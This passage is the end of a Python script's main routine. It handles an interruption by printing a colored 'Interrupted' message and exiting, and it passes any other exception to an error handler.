        print(f"\n{Colors.Y}Interrupted{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        error_handler.handle(e, exit_on_error=True)
